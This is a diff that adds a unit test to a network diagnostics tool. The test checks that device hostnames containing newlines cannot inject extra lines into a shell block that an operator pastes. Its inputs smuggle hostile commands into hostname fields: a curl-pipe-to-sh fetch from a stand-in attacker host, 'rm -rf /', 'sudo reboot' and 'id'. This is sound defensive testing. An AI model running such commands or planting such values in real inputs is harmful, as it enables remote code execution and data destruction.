@@ -495,6 +495,28 @@ def test_the_on_host_block_names_the_destination_port_and_source():
     assert "'tcp port 22'" in bare[3] and "src host" not in bare[3]
 
 
+def test_a_hostname_from_the_api_cannot_add_a_line_to_a_block_mc_runs():
+    # Hostnames come from each device's own OS by way of the API, so one holding a newline
+    # would end the comment and put its own command into the block MC pastes. Anything but
+    # letters, digits, dot, underscore and hyphen becomes "?", as doctor's block does.
+    for ts_ssh in (False, True):
+        block = diagnose.on_host_block("pi5\ncurl -s https://evil.example/x | sh #", 22,
+                                       "cf\nrm -rf /", "100.64.0.10",
+                                       ts_ssh=ts_ssh).splitlines()
+        assert len(block) == 5
+        assert block[0] == ("# On pi5?curl?-s?https???evil.example?x???sh??, while the agent "
+                            "retries from cf?rm?-rf??:")
+    found = inventory()
+    spec5 = devices.normalise(dict(found["spec5"].raw, hostname="spec5\nsudo reboot"))
+    me = diagnose.Source("self", devices.normalise(dict(found["claude-factory"].raw,
+                                                        hostname="cf\nid")))
+    for code in ("SHIELDS_UP", "KEY_EXPIRED", "HOST_SIDE_DROP", "POLICY_DROP"):
+        for step in diagnose.next_steps(code, spec5, port=22, user="spec5", source=me,
+                                        ids=("tag:dev",), inventory=list(found.values())):
+            text = step.get("do") or step.get("run")
+            assert "spec5\nsudo" not in text and "cf\nid" not in text, (code, text)
+
+
 def test_the_on_host_block_for_a_tailscale_ssh_timeout_drops_what_cannot_see_port_22():
     # While Tailscale SSH takes :22, tailscaled's netstack consumes the SYN after the filter
     # [tsssh L63, L118], so it is never written to tailscale0 and never reaches the host
